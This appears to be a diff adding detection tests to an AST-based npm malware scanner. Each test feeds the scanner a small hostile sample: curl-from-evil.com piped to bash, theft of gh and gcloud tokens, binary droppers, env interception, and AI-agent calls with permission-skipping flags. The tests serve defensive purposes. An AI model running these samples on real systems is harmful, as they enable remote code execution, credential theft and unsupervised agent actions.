@@ -130,6 +130,469 @@ async function runAstTests() {
       assert(t.file === 'index.mjs', 'File should be index.mjs');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- Sandbox evasion detection ---
+
+  await asyncTest('AST: Detects sandbox evasion via fs.existsSync(/.dockerenv)', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nif (fs.existsSync('/.dockerenv')) process.exit(0);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'sandbox_evasion');
+      assert(t, 'Should detect sandbox evasion via /.dockerenv');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects sandbox evasion via fs.accessSync(/proc/1/cgroup)', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\ntry { fs.accessSync('/proc/1/cgroup'); } catch(e) {}`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'sandbox_evasion');
+      assert(t, 'Should detect sandbox evasion via /proc/1/cgroup');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Workflow write detection ---
+
+  await asyncTest('AST: Detects writeFileSync to .github/workflows (literal path)', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nfs.writeFileSync('.github/workflows/evil.yml', 'run: curl evil.com');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'workflow_write');
+      assert(t, 'Should detect writeFileSync to .github/workflows');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects writeFileSync to .github/workflows via variable tracking', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst path = require('path');\nconst wf = path.join('.github', 'workflows');\nfs.writeFileSync(wf, 'run: evil');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'workflow_write');
+      assert(t, 'Should detect writeFileSync to .github/workflows via variable tracking');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects mkdirSync creating .github/workflows', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst path = require('path');\nconst wf = path.join('.github', 'workflows');\nfs.mkdirSync(wf, {recursive: true});`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'workflow_write');
+      assert(t, 'Should detect mkdirSync creating .github/workflows');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Binary dropper ---
+
+  await asyncTest('AST: Detects binary dropper (chmod + exec compound)', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst { execSync } = require('child_process');\nfs.chmodSync('/tmp/payload', 0o755);\nexecSync('/tmp/payload');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'binary_dropper');
+      assert(t, 'Should detect binary dropper pattern (chmod + exec)');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- crypto.createDecipher / createDecipheriv ---
+
+  await asyncTest('AST: Detects crypto.createDecipher (flatmap-stream pattern)', async () => {
+    const tmp = makeTempPkg(`const crypto = require('crypto');\nconst d = crypto.createDecipher('aes256', key);\nd.update(data);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'crypto_decipher');
+      assert(t, 'Should detect crypto.createDecipher');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects crypto.createDecipheriv', async () => {
+    const tmp = makeTempPkg(`const crypto = require('crypto');\nconst d = crypto.createDecipheriv('aes-256-cbc', key, iv);\nd.update(data);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'crypto_decipher');
+      assert(t, 'Should detect crypto.createDecipheriv');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- module._compile ---
+
+  await asyncTest('AST: Detects module._compile()', async () => {
+    const tmp = makeTempPkg(`const m = new module.constructor();\nm._compile('malicious code', 'fake.js');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'module_compile');
+      assert(t, 'Should detect module._compile()');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- new Proxy(process.env) ---
+
+  await asyncTest('AST: Detects new Proxy(process.env, handler)', async () => {
+    const tmp = makeTempPkg(`const p = new Proxy(process.env, { get(t, k) { return t[k]; } });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_proxy_intercept');
+      assert(t, 'Should detect new Proxy(process.env)');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Object.defineProperty(process.env) ---
+
+  await asyncTest('AST: Detects Object.defineProperty(process.env)', async () => {
+    const tmp = makeTempPkg(`Object.defineProperty(process.env, 'SECRET', { get() { return 'stolen'; } });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_proxy_intercept');
+      assert(t, 'Should detect Object.defineProperty(process.env)');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Prototype hooking ---
+
+  await asyncTest('AST: Detects globalThis.fetch override', async () => {
+    const tmp = makeTempPkg(`const origFetch = globalThis.fetch;\nglobalThis.fetch = function(...a) { log(a); return origFetch(...a); };`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'prototype_hook' && t.message.includes('fetch'));
+      assert(t, 'Should detect globalThis.fetch override');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects XMLHttpRequest.prototype hooking', async () => {
+    const tmp = makeTempPkg(`XMLHttpRequest.prototype.open = function(m, u) { exfil(u); };`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'prototype_hook' && t.message.includes('XMLHttpRequest'));
+      assert(t, 'Should detect XMLHttpRequest.prototype hooking');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects http.IncomingMessage.prototype hooking (CRITICAL)', async () => {
+    const tmp = makeTempPkg(`const http = require('http');\nhttp.IncomingMessage.prototype.emit = function() {};`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'prototype_hook' && t.message.includes('IncomingMessage'));
+      assert(t, 'Should detect http.IncomingMessage.prototype hooking');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects http.request override', async () => {
+    const tmp = makeTempPkg(`const http = require('http');\nhttp.request = function(opts, cb) { log(opts); };`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'prototype_hook' && t.message.includes('http.request'));
+      assert(t, 'Should detect http.request override');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- require.cache poisoning ---
+
+  await asyncTest('AST: Detects require.cache access', async () => {
+    const tmp = makeTempPkg(`delete require.cache[require.resolve('fs')];`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'require_cache_poison');
+      assert(t, 'Should detect require.cache access');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Env access: sensitive keyword escalation ---
+
+  await asyncTest('AST: Detects process.env.SECRET_KEY as HIGH', async () => {
+    const tmp = makeTempPkg(`const s = process.env.SECRET_KEY;`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_access' && t.severity === 'HIGH');
+      assert(t, 'Should detect SECRET_KEY access as HIGH');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: No false positive for process.env.npm_config_registry', async () => {
+    const tmp = makeTempPkg(`const r = process.env.npm_config_registry;`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_access');
+      assert(!t, 'process.env.npm_config_* should NOT trigger env_access');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: No false positive for process.env.NODE_ENV', async () => {
+    const tmp = makeTempPkg(`const e = process.env.NODE_ENV;`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_access');
+      assert(!t, 'process.env.NODE_ENV should NOT trigger env_access');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- String.fromCharCode + dynamic env ---
+
+  await asyncTest('AST: Detects env_charcode_reconstruction with fromCharCode + process.env[key]', async () => {
+    const tmp = makeTempPkg(`const k = String.fromCharCode(71,73,84,72,85,66,95,84,79,75,69,78);\nconst v = process.env[k];`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_charcode_reconstruction');
+      assert(t, 'Should detect env_charcode_reconstruction');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Staged binary payload ---
+
+  await asyncTest('AST: Detects staged binary payload (.png + eval)', async () => {
+    const tmp = makeTempPkg(`const d = require('fs').readFileSync('payload.png');\neval(d.toString());`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'staged_binary_payload');
+      assert(t, 'Should detect staged binary payload (.png + eval)');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Spawn with detached: true ---
+
+  await asyncTest('AST: Detects spawn with {detached: true}', async () => {
+    const tmp = makeTempPkg(`const { spawn } = require('child_process');\nspawn('node', ['script.js'], { detached: true });`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'detached_process');
+      assert(t, 'Should detect spawn with detached: true');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Spawn with shell binary ---
+
+  await asyncTest('AST: Detects spawn(/bin/bash)', async () => {
+    const tmp = makeTempPkg(`const { spawn } = require('child_process');\nspawn('/bin/bash', ['-c', 'whoami']);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_call_exec');
+      assert(t, 'Should detect spawn with shell binary');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- AI agent abuse ---
+
+  await asyncTest('AST: Detects AI agent abuse (--yolo flag)', async () => {
+    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nexecSync('claude --yolo "do something"');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'ai_agent_abuse');
+      assert(t, 'Should detect AI agent abuse with --yolo flag');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects AI agent abuse (--dangerously-skip-permissions)', async () => {
+    const tmp = makeTempPkg(`const { spawn } = require('child_process');\nspawn('claude', ['--dangerously-skip-permissions', 'task']);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'ai_agent_abuse');
+      assert(t, 'Should detect --dangerously-skip-permissions');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Credential CLI theft ---
+
+  await asyncTest('AST: Detects credential CLI theft (gh auth token)', async () => {
+    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nconst token = execSync('gh auth token').toString();`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_command_exec');
+      assert(t, 'Should detect credential CLI theft via gh auth token');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects credential CLI theft (gcloud auth print-access-token)', async () => {
+    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nconst t = execSync('gcloud auth print-access-token').toString();`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_command_exec');
+      assert(t, 'Should detect credential CLI theft via gcloud');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Dynamic require with decode ---
+
+  await asyncTest('AST: Detects dynamic require with base64 decode (CRITICAL)', async () => {
+    const tmp = makeTempPkg(`const m = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dynamic_require' && t.severity === 'CRITICAL');
+      assert(t, 'Should detect dynamic require with base64 decode as CRITICAL');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects dynamic require with concat', async () => {
+    const tmp = makeTempPkg(`const m = require('child' + '_process');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dynamic_require');
+      assert(t, 'Should detect dynamic require with string concatenation');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects dynamic require with template literal', async () => {
+    const tmp = makeTempPkg('const name = "process";\nconst m = require(`child_${name}`);');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dynamic_require');
+      assert(t, 'Should detect dynamic require with template literal');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Staged eval decode ---
+
+  await asyncTest('AST: Detects staged eval decode (eval + atob)', async () => {
+    const tmp = makeTempPkg(`eval(atob('Y29uc29sZS5sb2coImhlbGxvIik='));`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'staged_eval_decode');
+      assert(t, 'Should detect staged eval decode with atob');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects staged eval decode (eval + Buffer.from base64)', async () => {
+    const tmp = makeTempPkg(`eval(Buffer.from('Y29uc29sZS5sb2coImhlbGxvIik=', 'base64').toString());`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'staged_eval_decode');
+      assert(t, 'Should detect staged eval decode with Buffer.from base64');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects staged Function decode (Function call + atob)', async () => {
+    const tmp = makeTempPkg(`Function(atob('cmV0dXJuIDE='))();`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'staged_eval_decode');
+      assert(t, 'Should detect staged Function decode with atob');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Dynamic import ---
+
+  await asyncTest('AST: Detects dynamic import of child_process', async () => {
+    const tmp = makeTempPkg(`import('child_process').then(cp => cp.exec('whoami'));`, 'index.mjs');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dynamic_import');
+      assert(t, 'Should detect dynamic import of child_process');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects dynamic import with computed argument', async () => {
+    const tmp = makeTempPkg(`const m = 'child_process';\nimport(m).then(cp => cp.exec('whoami'));`, 'index.mjs');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dynamic_import' && t.message.includes('computed'));
+      assert(t, 'Should detect dynamic import with computed argument');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Eval with constant string (LOW) vs dynamic (HIGH) ---
+
+  await asyncTest('AST: eval with constant string is LOW severity', async () => {
+    const tmp = makeTempPkg(`eval('1 + 2');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.severity === 'LOW');
+      assert(t, 'eval("1+2") should be LOW severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Dangerous exec with shell pipe ---
+
+  await asyncTest('AST: Detects exec with curl pipe to shell', async () => {
+    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nexecSync('curl http://evil.com/payload | bash');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_exec');
+      assert(t, 'Should detect exec with curl pipe to shell');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Dynamic require + exec chain ---
+
+  await asyncTest('AST: Detects dynamic require exec chain', async () => {
+    const tmp = makeTempPkg(`const mod = require(name);\nmod.execSync('whoami');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dynamic_require_exec');
+      assert(t, 'Should detect execSync called on dynamically-required module');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Exec with temp file path via variable ---
+
+  await asyncTest('AST: Detects exec of temp file path via variable', async () => {
+    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nconst p = '/tmp/payload';\nexecSync(p);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_exec' && t.message.includes('binary dropper'));
+      assert(t, 'Should detect exec of temp file via variable tracking');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Spawn with conditional shell binary ---
+
+  await asyncTest('AST: Detects spawn with conditional shell binary', async () => {
+    const tmp = makeTempPkg(`const { spawn } = require('child_process');\nspawn(process.platform === 'win32' ? 'cmd.exe' : '/bin/bash', ['-c', 'whoami']);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_call_exec' && t.message.includes('conditional'));
+      assert(t, 'Should detect spawn with conditional shell binary');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- AI agent dangerous flag as string literal ---
+
+  await asyncTest('AST: Detects AI agent flag as string literal', async () => {
+    const tmp = makeTempPkg(`const flag = '--dangerously-skip-permissions';`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'ai_agent_abuse');
+      assert(t, 'Should detect AI agent dangerous flag as string literal');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Exec with dangerous cmd via variable ---
+
+  await asyncTest('AST: Detects exec with dangerous cmd string via variable', async () => {
+    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nconst cmd = 'curl http://evil.com';\nexecSync(cmd);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_exec');
+      assert(t, 'Should detect exec with dangerous cmd via variable tracking');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- readdirSync on .github/workflows ---
+
+  await asyncTest('AST: Detects readdirSync on .github/workflows', async () => {
+    const tmp = makeTempPkg(`const fs = require('fs');\nconst path = require('path');\nconst wf = path.join('.github', 'workflows');\nconst files = fs.readdirSync(wf);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'workflow_write');
+      assert(t, 'Should detect readdirSync on .github/workflows');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
